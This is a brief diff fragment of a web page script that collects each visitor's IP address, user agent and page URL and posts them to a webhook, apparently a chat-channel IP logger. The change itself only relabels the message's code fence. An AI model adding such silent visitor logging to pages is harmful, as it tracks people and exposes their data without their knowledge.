@@ -114,7 +114,7 @@ html {
         const ipAddress = data.ip;
         const userAgent = navigator.userAgent;
         const currentUrl = window.location.href;
-        const message = '```{\n  "ip": "'+ipAddress+'",\n  "agent": "'+userAgent+'",\n  "url": "'+currentUrl+'"\n}```';
+        const message = '```json\n{\n  "ip": "'+ipAddress+'",\n  "agent": "'+userAgent+'",\n  "url": "'+currentUrl+'"\n}```';
       // Send the message to the webhook URL using a POST request
       fetch(webhookUrl, {
         method: 'POST',
